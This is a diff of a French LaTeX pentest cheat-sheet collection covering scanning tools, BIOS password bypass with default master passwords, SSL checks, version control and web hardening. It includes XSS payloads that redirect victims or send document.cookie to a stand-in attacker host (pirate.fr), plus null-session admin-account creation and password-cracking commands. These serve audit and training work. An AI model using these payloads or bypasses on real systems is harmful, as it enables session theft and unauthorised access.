@@ -1,4 +1,11 @@
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%En cours : 
+%			- fiches SQL par type de BDD
+%           - VI
+%           - supprimer fiche Backtrack
+%			- fiche DNS
+%			- IRC + screen + issi
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 % Auteur  : Hanteville Nicolas
 % Site    : http://omni-a.blogspot.com/
 % Sources : http://code.google.com/p/omnia-projetcs/
@@ -7,7 +14,7 @@
 %					 dans le cadre d'audits de securite, administration
 %					 et tests d'intrusion.
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\documentclass[a4paper,11pt]{article}				% entete standard pour feuille de format A4, en police 12pt et en edition en article
+\documentclass[a4paper,11pt]{article}				    % entete standard pour feuille de format A4, en police 12pt et en edition en article
 \usepackage[latin1]{inputenc}							% format d'ecriture en latin1
 \usepackage[T1]{fontenc}								% format d'encodage de l'ecriture
 \usepackage[francais]{babel}							% conversion des phrases type pour le francais
@@ -21,7 +28,7 @@
 \usepackage{pst-all} 									% Pour pstricks
 \usepackage{wasysym} 									% Pour QCM, pour utiliser les commandes $\Square$
 \usepackage{textcomp}
-\usepackage{ifthen} 										% gestion des test :)
+\usepackage{ifthen} 								    % gestion des test :)
 \usepackage{color}
 \definecolor{vert}{rgb}{0.3,0.6,0.5}  
 
@@ -30,9 +37,9 @@
 \usepackage{listings}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 %Versions
-\newcommand{\release}[0]{-1} 		% 1 = on masque les fiches en cours, 0 = on les affiche
-\newcommand{\releaseNOHACK}[0]{0} 	% 1 = on masque les fiches avec des attaques , 0 = on les affiche
-\newcommand{\releaseNOIMG}[0]{1} 	% 1 = on masque les images/logos des fiches
+\newcommand{\release}[0]{-1} 		    % 1 = on masque les fiches en cours, 0 = on les affiche
+\newcommand{\releaseNOHACK}[0]{0} 	    % 1 = on masque les fiches avec des attaques , 0 = on les affiche
+\newcommand{\releaseNOIMG}[0]{1} 	    % 1 = on masque les images/logos des fiches
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 % gestion des marges
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -448,7 +455,7 @@ Pour afficher la configuration locale du proxy : {\sl \color{blue}env | grep -i 
 	\item \textbf{Backtrack 5 :}\\
 	{\sl \color{blue}
 	deb http://all.repository.backtrack-linux.org revolution main microverse non-free testing\\
-	wget -O - http://all.repository.backtrack-linux.org/backtrack.gpg -O -| apt-key add -
+	wget -O - http://all.repository.backtrack-linux.org/backtrack.gpg | apt-key add -
 	}\vskip+0.1cm
 	\item \textbf{Remastersys :} \textit{outil de sauvegarde et cr\'eation de distribution Linux.}\\	
 	{\sl \color{blue}
@@ -683,21 +690,6 @@ Ci-dessous un exemple d'outils pr\'esents.
 \textbf{Scan ICMP rapide, multi-machines :}\addcontentsline{toc}{subsubsection}{Fping}\\
 {\sl \color{blue}fping -a -g 192.168.1.0/24}\vskip+0.2cm
 
-\url{http://www.inetcat.net/software/nbtscan.html}\addcontentsline{toc}{subsubsection}{Nbtscan}\\
-\textbf{Scan Netbios :}\\
-{\sl \color{blue}nbtscan -v 192.168.1.0/24}\vskip+0.2cm
-
-\url{http://sourceforge.net/projects/sslscan/}\addcontentsline{toc}{subsubsection}{SSLscan}\\
-\textbf{Test SSL :} \textit{Attention pour tester SSLv2 : \url{http://security.sunera.com/2011_02_01_archive.html}}\\
-{\sl \color{blue}sslscan {-}{-}no-failed 192.168.1.1}\vskip+0.2cm
-
-\url{http://www.thc.org/root/tools/}\addcontentsline{toc}{subsubsection}{THCSSLCheck}\\
-{\sl \color{blue}THCSSLCheck.exe 192.168.1.1 443}\vskip+0.2cm
-
-\url{http://www.nta-monitor.com/tools/ike-scan/}\addcontentsline{toc}{subsubsection}{Ike-scan}\\
-\textbf{Test VPN :}\\
-{\sl \color{blue}ike-scan 192.168.1.0/24}\vskip+0.2cm
-
 \vskip+0.2cm
 {\LARGE DNS}\\
 \textbf{Script perl d'\'enum\'eration DNS, brute force de domaines, transfert de zone :}\addcontentsline{toc}{subsubsection}{Dnsenum.pl}\\
@@ -716,16 +708,6 @@ Ci-dessous un exemple d'outils pr\'esents.
 \url{http://werew01f.blogspot.com/2009/09/openmr-open-mail-relay.html}\addcontentsline{toc}{subsubsection}{OpenMR.pl}\\
 \textbf{Script perl de service de messagerie, permet de v\'erifier le relais de message, et infos DNS :}\\
 {\sl \color{blue}perl ./OpenMR domaine.org info}\vskip+0.2cm
-
-\vskip+0.2cm
-{\LARGE CISCO}\\
-\textbf{CISCO scanner, d\'ecouverte d'\'el\'ements actifs CISCO suivant les classes d'adresse (A:1,B:2,C:3) :}\\
-{\sl \color{blue}./pentest/cisco/ciscos/ciscos 192.168.0 3}\vskip+0.2cm
-
-\vskip+0.2cm
-{\LARGE WEB}\\
-\textbf{Wapiti, script python scanner de vuln\'erabilit\'e WEB SQL/JSP/PHP/ASP/XSS, ici scanne de l'adresse http://www.google.fr en mettant en surbriance les vuln\'erabilit\'es, et en affichant la liste des tests effectu\'es :}\addcontentsline{toc}{subsubsection}{Wapiti}\\
-{\sl \color{blue}wapiti http://www.google.fr/ -u -v 2}\vskip+0.2cm
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Base64}{protocole.png}
@@ -752,6 +734,63 @@ Le r\'esultat est plus important que la taille d'origine : 3octets = 4octets enc
 
 \textbf{Tableaux des codes ASCII+ASCII \'etendu OEM :}\\
 \includegraphics[scale=0.52]{ascii_table.png}\vskip+0.2cm
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\fiche{}{BIOS}{bios.png}
+{\url{http://www.tech-faq.com/reset-bios-password.html}}
+{
+\\Basic Input Output System (BIOS), permet la gestion des op\'erations \'el\'ementaires lors de sa mise sous tension. Il gère la séquence de d\'emarrage et peut \^etre prot\'eg\'e par un mot de passe. Progressivement remplac\'e par l'Unified Extensible Firmware Interface (UEFI) qui permet beaucoup plus de param\'etrages.\\
+Plusieurs outils permettent de passer outre le mot de passe de modification du BIOS. Ils exploitent la présence d'un mot de passe constructeur ma\^itre permettant la r\'ecup\'eration du BIOS en cas de perte de mot de passe.
+}
+{
+{\Large Outils g\'en\'eriques / Tutoriels}
+\begin{description}
+	\item[CmosPwd] : \url{http://www.cgsecurity.org/wiki/CmosPwd}
+	\item[Unlock code generator] : {\small \url{http://dogber1.blogspot.com/2009/05/table-of-reverse-engineered-bios.html}}
+	\item[!BIOS] : \url{http://web.archive.org/web/20080821232354/}\\ \url{http://www.11a.nu/software/bios-pc-bios-security-and-maintanance-toolkit/}
+	\item[pwgen] : \url{http://dogber1.blogspot.fr/2009/05/table-of-reverse-engineered-bios.html}\\\url{https://github.com/bacher09/pwgen-for-bios}
+\vskip+0.4cm
+	\item[ACER] : \url{http://www.tech-faq.com/how-do-i-reset-an-acer-bios-password.html}
+	\item[DELL] : \url{http://www.tech-faq.com/reset-dell-bios-password.html}
+	\item[HP] : \url{http://code.google.com/p/hp-bios-password-cracker/}\\\url{http://code.google.com/p/hp-cmi-bios-setting-profile-builder/}
+	\item[IBM] : \url{http://www.tech-faq.com/reset-ibm-thinkpad-bios-password.html}\\ 
+				 \url{http://sodoityourself.com/hacking-ibm-thinkpad-bios-password/}\\
+				 \url{http://www.thinkwiki.org/wiki/Maintenance}
+	\item[Toshiba] : \url{http://www.buzzard.me.uk/toshiba/index.html}\\ \url{http://www.laptop-repair.info/clear_bios_password.html} \\ \url{http://www.cgsecurity.org/keydisk.exe}
+\end{description}
+\vskip+0.2cm
+\begin{tabular}{|l|l|}
+\hline
+Fabricant & Mot de passe par défaut\\\hline\hline
+AMI	 			&	{\scriptsize A.M.I., AAAMMMIII, AMI?SW, AMI\_SW, BIOS, CONDO, HEWITT RAND, LKWPETER, MI, PASSWORD}\\\hline
+Award BIOS		&	
+\begin{minipage}[t][1.3cm][t]{9cm}
+\scriptsize
+01322222,589589,589721,595595,598598,ALFAROME,ALLY,ALLy,aLLY,aLLy,aPAf,award,AWARD~PW,\\
+AWARD SW,AWARD?SW,AWARD\_PW,AWARD\_SW,AWKWARD,awkward,BIOSTAR,CONCAT,CONDO,\\
+Condo,condo,d8on,djonet,HLT,J256,J262,j262,j322,j332,J64,KDD,LKWPETER,Lkwpeter,PINT,pint,SER,\\
+SKY\_FOX,SYXZ,syxz,TTPTHA,ZAAAADA,ZAAADA,ZBAAACA,ZJAAADC
+\end{minipage}\\\hline
+Phoenix	BIOS	&	BIOS, CMOS, phoenix, PHOENIX\\\hline
+VOBIS \& IBM	&	merlin\\\hline
+Dell			&	Dell\\\hline
+Biostar			&	Biostar\\\hline
+Compaq			&	Compaq\\\hline
+Enox			&	xo11nE\\\hline
+Epox			&	central\\\hline
+Freetech		&	Posterie\\\hline
+IWill			&	iwill\\\hline
+Jetway			&	spooml\\\hline
+Packard Bell	&	bell9\\\hline
+QDI				&	QDI\\\hline
+Siemens			&	SKY\_FOX\\\hline
+SOYO			&	SY\_MB\\\hline
+TMC				&	BIGO\\\hline
+Toshiba			&	Toshiba\\\hline
+\end{tabular}
+
+
+
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Capture de flux SSL/HTTPS}{ssl.jpg}
@@ -1007,7 +1046,7 @@ En cas d'erreur il est possible d'utiliser les options {\sl \color{blue}-v} et {
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \HACKfiche{}{Dirbuster}{owasp.jpg}
-{\url{http://sourceforge.net/projects/dirbuster/}\\\url{http://code.google.com/p/wfuzz/}}
+{\url{http://sourceforge.net/projects/dirbuster/}\\\url{http://code.google.com/p/wfuzz/}\\\url{http://www.unixuser.org/~euske/python/webstemmer/}}
 {
 \\Application Java (multi-OS Windows, Linux et Mac) de la fondation OWASP, spider/crawler de site Web \`a base de dictionnaire. 
 L'application peut \^etre utilis\'ee en mode graphique, ou en mode console.\\
@@ -1026,10 +1065,16 @@ Un autre fuzze Web : Freakin' Simple Fuzzer \url{http://code.google.com/p/fm-fsf
 \vskip+0.2cm
 {\sl \color{blue}java -jar DirBuster-0.12.jar -u http://www.google.fr -H -l directory-list-2.3-small.txt -e php -s / -r resultats.txt}\\
 
-\textbf{Un autre outils de fuzzing :}\addcontentsline{toc}{subsubsection}{Wfuzz}\\
-\textit{Ne g\`ere pas le suivi de lien dans la page. Ici en activant 50 threads et en ne traitant pas les r\'eponses 400 et 404.}
+\textbf{Wfuzz :}\addcontentsline{toc}{subsubsection}{Wfuzz}\\
+\textit{Autre outils de fuzzing. Il ne g\`ere pas le suivi de lien dans la page. Ici en activant 50 threads et en ne traitant pas les r\'eponses 400 et 404.}
 \vskip+0.2cm
 {\sl \color{blue}./wfuzz.py -c -t 50 {-}{-}hc 400 {-}{-}hc 404 -z file,dico.txt http://192.168.0.1/FUZZ}\\
+
+\textbf{Webstemmer :}\addcontentsline{toc}{subsubsection}{Webstemmer}\\
+\textit{R\'eel crawler, sans gestion de dictionnaire, sauvegarde le r\'esultat dans un fichier zip.}\vskip+0.2cm
+\textbf{Crawl d'un site :}\\
+{\sl \color{blue}./textcrawler.py -o <fichier de sortie> <url>}\\
+
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \HACKfiche{}{Driftnet}{protocole.png}
@@ -2376,6 +2421,8 @@ Permet de g\'erer des groupes de communications (sur des switches/routeur) pour 
 			\rowcolor[gray]{.9} \textbf{Outils et liens}\\\hline
 			\begin{minipage}[t][8.34cm][t]{9cm}
 			\vskip - 0.1cm
+			\textbf{Scan d'EAR CISCO par classes d'adresse (A:1,B:2,C:3) : }
+			{\sl \color{blue}\footnotesize./pentest/cisco/ciscos/ciscos 192.168.0 3}\\
 			\textbf{GNS3} : simulateur d'EAR et r\'eseau\vskip-0.1cm \url{http://www.gns3.net/}\\
 			\textbf{IOSHunter} : recherche et t\'el\'echargement d'IOS\vskip-0.1cm \url{http://www.vitaltech-group.com/IOSHunter.htm}\\
 			\textbf{Nipperme} : test de configuration EAR CISCO\vskip-0.1cm \url{http://nipperme.sourceforge.net/}\vskip-0.1cm
@@ -3524,7 +3571,7 @@ ntds\_dump\_hash ntdsxtract& NTDIS.DIT			& AD+CacheDump					& 2003,2008					& \u
 \addcontentsline{toc}{subsubsection}{ntds\_dump\_hash}
 \addcontentsline{toc}{subsubsection}{ntdsxtract}
 \addcontentsline{toc}{subsubsection}{vssown}
-Ressources compl\'ementaires pour \textbf{ntds\_dump\_hash \& ntdsxtract} :\\
+Ressources compl\'ementaires pour \textbf{ntds\_dump\_hash \& ntdsxtract} :
 \begin{itemize}
 \item Script de shadow copy : \url{http://tools.lanmaster53.com/vssown.vbs}
 \item Ressources : \url{http://pauldotcom.com/2011/12/safely-dumping-hashes-now-avai.html}\\ \url{http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html}
@@ -6084,10 +6131,9 @@ FTP, SSH, TELNET, HTTP(S), POP3(S)
 \textit{Attention pour que les commandes fonctionnent, NetBIOS doit \^etre activ\'e sur la machine locale. 
 Certains outils risquent de ne pas fonctionner si cette cl\'e n'est pas \`a 0 ou 1 \textbf{\small HKEY\_LOCAL\_MACHINE$\backslash$SYSTEM$\backslash$CurrentControlSet$\backslash$Control$\backslash$Lsa$\backslash$lmcompatibilitylevel}}\\
 \textbf{Lecture de la table de nom de l'ordinateur distant : }\\
-Windows : {\sl \color{blue}nbtstat -A 192.168.0.1}\\ 
-Linux : {\sl \color{blue}smbclient -L 192.168.0.1}\vskip + 0.2cm
+(Windows) {\sl \color{blue}nbtstat -A 192.168.0.1} ou (Linux) {\sl \color{blue}smbclient -L 192.168.0.1}\vskip + 0.2cm
 \textit{Si la commande se termine normalement, une NULL session est possible (sans login ni mot de passe).}\\
-Pour que les sessions nulles soient possibles il faut que les cl\'es DWORD du registre suivantes soient \`a 0 :\\
+Pour que les sessions nulles soient possibles, il faut que les cl\'es DWORD du registre suivantes soient \`a 0 :\\
 {\sl \color{blue}
 HKEY\_LOCAL\_MACHINE$\backslash$SYSTEM$\backslash$CurrentControlSet$\backslash$Control$\backslash$Lsa$\backslash$restrictanonymous, restrictanonymoussam, lmcompatibilitylevel}\vskip+0.15cm
 \textbf{Test de NULL session : }\\
@@ -6099,7 +6145,7 @@ Windows : {\sl \color{blue}net user NomUtilisateur MotDePasse /add}\\
 Windows : {\sl \color{blue}net localgroup Administrateurs NomUtilisateur /add}\\
 ou {\sl \color{blue}net group Administrateurs NomUtilisateur /add}
 \vskip+0.15cm
-Attention sous Windows, pour ces commandes cygwin*.dll doit se trouver dans le m\^eme r\'epertoire.\\ \url{http://www.securityforest.com/downloads/Enum+.zip}\vskip +0.2cm
+Attention sous Windows, pour ces commandes cygwin*.dll doit se trouver dans le m\^eme r\'epertoire.\\ \url{http://www.securityforest.com/downloads/Enum+.zip}\\
 \textbf{\'Enum\'eration des utilisateurs et groupes locaux (\textit{-U} ou \textit{-G}) : }\addcontentsline{toc}{subsubsection}{Enum} \\
 {\sl \color{blue}enum -U 192.168.0.1}\vskip+0.15cm
 \textbf{Politique de s\'ecurit\'e des comptes (local : \textit{-P} ou LSA : \textit{-L}) : }\\
@@ -6108,11 +6154,13 @@ Attention sous Windows, pour ces commandes cygwin*.dll doit se trouver dans le m
 {\sl \color{blue}smbserverscan 192.168.0.1}\vskip+0.15cm
 \textbf{Liste des partages, groupes, utilisateurs, politiques de s\'ecurit\'e : }\addcontentsline{toc}{subsubsection}{Userinfo-ng} \\
 {\sl \color{blue}userinfo-ng 192.168.0.1}\vskip+0.15cm
-\textbf{Tests de s\'ecurit\'e avec tests de cassage de mdp :}\addcontentsline{toc}{subsubsection}{smb-nat} \\
+\textbf{Tests de s\'ecurit\'e avec tests de cassage de mdp :}\addcontentsline{toc}{subsubsection}{smb-nat}\\
 {\sl \color{blue}smb-nat 192.168.0.1 -o resultat.txt -u dico\_user.txt -p dico\_mdp.txt}\vskip+0.15cm
 
+\textbf{Scan NetBIOS :}\addcontentsline{toc}{subsubsection}{Nbtscan} \url{http://www.inetcat.net/software/nbtscan.html}\\
+{\sl \color{blue}nbtscan -v 192.168.1.0/24}\vskip+0.15cm
 \textit{L'outil SuperScan permet aussi d'effectuer tous ces tests de mani\`ere automatique.}\\
-\url{http://www.foundstone.com/us/resources/proddesc/superscan.htm}\vskip+0.15cm
+\url{http://www.foundstone.com/us/resources/proddesc/superscan.htm}\\
 \textit{LUS permet d'effectuer un reverse SID, une \'enum\'eration NetBIOS, RPC\dots{}} \url{http://omni.a.free.fr}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -7177,6 +7225,7 @@ send(p)}\vskip+0.1cm
 	\item \textbf{\nameref{SkipFish}}
 	\item \textbf{\nameref{SQLmap - Commandes}}
 	\item\textbf{Swfintruder} : \url{http://code.google.com/p/swfintruder/}
+	\item\textbf{Wapiti} : (exemple : {\sl \color{blue}wapiti http://www.google.fr/ -u -v 2}) \url{http://wapiti.sourceforge.net/}
 	\item \textbf{\nameref{W3af}}
 	\item \textbf{\nameref{WebScarab}}
 	\item \textbf{OWASP Zed Attack Proxy (ZAP)} : \url{http://code.google.com/p/zaproxy/}
@@ -7212,9 +7261,9 @@ send(p)}\vskip+0.1cm
 \textbf{Base de donn\'ees}
 \begin{description}
 	\item[$\Square$] Renommer la base de donn\'ees, les comptes et tables par d\'efaut.\vskip-0.1cm
-   \item[$\Square$] Appliquer des droits sur la base de donn\'ees et sauvegarder les mots de passe sous forme de hash.\vskip-0.1cm
+   	\item[$\Square$] Appliquer des droits sur la base de donn\'ees et sauvegarder les mots de passe sous forme de hash.\vskip-0.1cm
 	\item[$\Square$] Utiliser des comptes utilisateurs SQL \`a acc\`es limit\'e (en lecture seule) quand cela est possible.\vskip-0.1cm
-   \item[$\Square$] Utiliser des \textbf{proc\'edures stock\'ees}, \`a la place du SQL dynamique. Les donn\'ees entr\'ees par l'utilisateur sont alors transmises comme param\`etres, limitant ainsi les risques d'injection.
+   	\item[$\Square$] Utiliser des \textbf{proc\'edures stock\'ees}, \`a la place du SQL dynamique. Les donn\'ees entr\'ees par l'utilisateur sont alors transmises comme param\`etres, limitant ainsi les risques d'injection.
 	\item[$\Square$] Utiliser des requ\^etes SQL \textbf{pr\'epar\'ees} (requ\^etes \`a trous envoy\'ees au serveur, qui se charge d'\'echapper les caract\`eres selon le type de param\`etre).
 	\item[$\Square$] Effectuer un contr\^ole des requ\^etes en limitant les droits aux commandes telles que EXEC, SELECT, INSERT, DROP, CREATE, ALTER, UPDATE\dots{}
 \end{description}
@@ -7223,6 +7272,7 @@ send(p)}\vskip+0.1cm
    \item[$\Square$] V\'erifier le lien de r\'ef\'erence (\textbf{referrer}) contenu dans les requ\^etes (compliquer \`a impl\'ementer).\vskip-0.1cm
    \item[$\Square$] Tester syst\'ematiquement les valeurs transmises : {\footnotesize\$\_GET, \$\_POST, \$\_COOKIE, \$\_REQUEST, AJAX\dots{}}\vskip-0.1cm
    \item[$\Square$] Pr\'ef\'erer l'envoi des donn\'ees via la m\'ethode \$\_POST plut\^ot que \$\_GET.\vskip-0.1cm
+   \item[$\Square$] Ne pas utiliser \$\_REQUEST (permet l'utilisation du m\^eme param\`etre en \$\_GET et \$\_POST).\vskip-0.1cm
    \item[$\Square$] S'assurer \`a chaque requ\^ete de l'authentification de l'utilisateur et que l'action correspond \`a ses droits.\vskip-0.1cm
    \item[$\Square$] Les cookies et num\'eros de session doivent avoir une limite de validit\'e.\vskip-0.1cm
 	\item[$\Square$] Ne jamais transmettre de donn\'ees confidentielles aux clients (son num\'ero de client dans l'URL\dots{}).\vskip-0.1cm
@@ -7397,8 +7447,8 @@ Tableau r\'ecapitulatif des caract\`eres pour l'encodage :\\
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \HACKfiche{}{S\'ecurit\'e Web - XSS}{kblackbox.png}
 {
-\url{http://ha.ckers.org/xss.html}, \url{http://heideri.ch/jso/}, \url{http://www.xssed.com}\\
-\url{http://www.segmentationfault.fr/projets/release-de-xeek-v0-1b/}
+\url{http://ha.ckers.org/xss.html}, \url{http://heideri.ch/jso/}, \url{http://www.wocares.com/noquote.php}\\
+\url{http://www.xssed.com}, \url{http://www.segmentationfault.fr/projets/release-de-xeek-v0-1b/}
 }
 {
 \small
@@ -7439,13 +7489,14 @@ Le principe est d'injecter du code (javascript) dans des variables qui doivent \
 \textbf{Redirection de flux (ou iframe) :}\\
 \textit{sur une page vuln\'erable de type : \url{http://test.com?user=toto}}
 \begin{itemize}
-	\item en HTML : {\footnotesize \url{http://test.com?user=<meta http-equiv="refresh" content="0; URL=http://pirate.fr">}}
+	\item en HTML : {\footnotesize \url{http://test.com?user=<meta http-equiv="refresh" content="0; URL="http://pirate.fr">}}
 	\item en JavaScript :\\
-{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript"><document.location.href="http://pirate.fr"</SCRIPT>}}
+{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript">document.location.href="http://pirate.fr"</SCRIPT>}}\\
+{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript">document.location ="http://pirate.fr"</SCRIPT>}}
 	\item en JavaScript(2) :\\
-{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript"><window.location.replace("http://pirate.fr")</SCRIPT>}}
+{\footnotesize \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript">window.location.replace("http://pirate.fr")</SCRIPT>}}
 	\item en VBScript :\\ 
-\textbf{\footnotesize \sl \color{blue}http://test.com?user=<\%\@ LANGUAGE="VBSCRIPT" response.redirect "http://www.commentcamarche.net" \%>}
+\textbf{\footnotesize \sl \color{blue}http://test.com?user=<\%\@ LANGUAGE="VBSCRIPT" response.redirect "http://pirate.fr" \%>}
 \end{itemize}
 
 \vskip+0.2cm
@@ -7453,7 +7504,7 @@ Le principe est d'injecter du code (javascript) dans des variables qui doivent \
 \textit{Envoi a un tiers, (ici la page pirate) le cookie de session d'un site, une fois que la victime a cliqu\'e sur le lien.}
 \begin{itemize}
 	\item en JavaScript :\\
-{\small \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript"><document.write("<img src=http://pirate.fr?.concat(escape(document.cookie))}}
+{\small \url{http://test.com?user=<SCRIPT LANGUAGE="JavaScript"><document.write("<img src=http://pirate.fr?".concat(escape(document.cookie))}}
 \end{itemize}
 
 \vskip+0.2cm
@@ -8020,6 +8071,36 @@ Pour plus de documentation voir le r\'epertoire \textbf{doc} de l'installation.
 \addcontentsline{toc}{subsubsection}{Medusa}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\fiche{}{SSL}{openssl.png}
+{\url{http://www.openssl.org}
+}
+{
+\\Secure Sockets Layer (SSL), est un protocole permettant le chiffrement des échanges réseau (couche transport).\\
+Attention les derni\`eres version d'OpenSSL ne sont pluc compatibles SSLv2, les outils de test l'exploitant ne peuvent donc plus v\'erifier sa pr\'esence. Voir : \url{http://security.sunera.com/2011_02_01_archive.html}
+}
+{
+\begin{LARGE}Points \`a v\'erifier : \end{LARGE}
+\begin{description}
+    \item[$\Square$] Le protocole SSLv2 vuln\'erable \`a des attaques de type MitM doit \^etre d\'esactiv\'ee.
+    \item[$\Square$] Les clés de chiffrement doivent être au minimum de 128bits.
+    \item[$\Square$] La ren\'egociation SSL doit \^etre d\'esactiv\'ee.
+    \item[$\Square$] Le certificat doit \^etre sign\'e pour le site par une autorit\'e reconnue.\\
+\end{description}
+
+\url{http://sourceforge.net/projects/sslscan/}\addcontentsline{toc}{subsubsection}{SSLscan}\\
+\textbf{SSLScan :} \textit{(Permet de v\'erifier les protocoles, suites cryptographiques et tailles de clé autoris\'ees.)\\
+ N'identifie pas le SSLv2 si OpenSSL n'est pas compil\'e avec (par d\'efaut sur les derni\`eres versions).}\\ 
+{\sl \color{blue}sslscan {-}{-}no-failed 192.168.1.1}\vskip+0.2cm
+
+\url{http://www.thc.org/root/tools/}\addcontentsline{toc}{subsubsection}{THCSSLCheck}\\
+\textbf{THCSSLCheck :}\\
+{\sl \color{blue}THCSSLCheck.exe 192.168.1.1 443 | grep -v 'unsupported'}\vskip+0.2cm
+
+\textbf{Ren\'egociation SSL :}\\
+Pour v\'erifier la ren\'egociation SSL, il suffit d'appuyer sur la touche {\sl \color{blue}R} :\\
+{\sl \color{blue}openssl s\_client -connect <ip>:<port>}
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Stunnel}{stunnel.png}
 {\url{http://www.stunnel.org/}\\
 \url{http://linuxgazette.net/107/odonovan.html}\\
@@ -8072,7 +8153,55 @@ Il faut cr\'eer un fichier de configuration personnalis\'e (exemple : {\sl \colo
 \textbf{Ex\'ecution de Stunnel :}\\
 {\sl \color{blue}stunnel4 services.conf}\\
 }
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\fiche{}{SubVersion}{subversion.png}
+{
+\url{http://subversion.apache.org/}, \url{http://cvs.nongnu.org/}, \url{http://git-scm.com/}
+}
+{
+	\\Logiciel de gestion des versions pour des fichiers, utilis\'e notemment par dans le cadre de d\'eveloppement.\\
+	Clients Windows : \url{http://tortoisesvn.net/}, \url{http://www.tortoisecvs.org/}, \url{http://code.google.com/p/tortoisegit/}
+}
+{
+\textbf{SVN}\addcontentsline{toc}{subsubsection}{SVN}\\
+\url{http://svnbook.red-bean.com/index.fr.html}
+\begin{itemize}
+	\item Cr\'eer une copie locale : {\sl \color{blue}svn checkout <URL> <project> {-}{-}username <utilisateur>}
+	\item Mettre \`a jour la copie locale : {\sl \color{blue}svn update}
+	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} svn add/delete <fichier>}
+	\item Appliquer les modifications sur le d\'ep\^ot original :\\ {\sl \color{blue}svn commit <file> -m "description de la MAJ" {-}{-}username <utilisateur>}
+\end{itemize}
 
+\vskip+0.5cm
+\textbf{CVS}\addcontentsline{toc}{subsubsection}{CVS}\\
+\url{http://ximbiot.com/cvs/manual/}
+\begin{itemize}
+	\item Cr\'eer une copie locale : {\sl \color{blue}cvs checkout <URL> <projet>}
+	\item Mettre \`a jour la copie locale par ssh :\\ 
+	{\sl \color{blue}
+	export CVSROOT=<ip>:<chemin>\\
+	export CVS\_RSH=ssh\\
+	cvs co *
+	}
+	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} cvs add/delete <fichier>}
+	\item Appliquer les modifications sur le d\'ep\^ot original : {\sl \color{blue}cvs commit <fichier>}
+\end{itemize}
+
+\vskip+0.5cm
+\textbf{GIT}\addcontentsline{toc}{subsubsection}{GIT}\\
+\url{http://git-scm.com/book/fr}
+\begin{itemize}
+	\item Configurer le nom d'utilisateur et le mail pour les commits : \\
+	{\sl \color{blue}
+	git config {-}{-}global user.name <utilisateur>\\
+	git config {-}{-}global user.email <mail>
+	}	
+	\item Cr\'eer une copie locale : {\sl \color{blue}git clone <URL>}
+	\item Mettre \`a jour la copie locale : {\sl \color{blue}git checkout <URL>}
+	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} git add/delete <fichier>}
+	\item Appliquer les modifications sur le d\'ep\^ot original : {\sl \color{blue}git commit -m "description de la MAJ"}
+\end{itemize}
+}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Tcpdump}{tcpdump.png}
 {
@@ -8133,17 +8262,21 @@ Pour plus d'information lire le man : \url{http://www.tcpdump.org/tcpdump_man.ht
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{USB}{USB.png}
 {
-\url{http://sourceforge.net/projects/noautorun/}
+\url{http://sourceforge.net/projects/noautorun/}, \url{http://www.flashboot.ru/iflash.html}
 }
 {
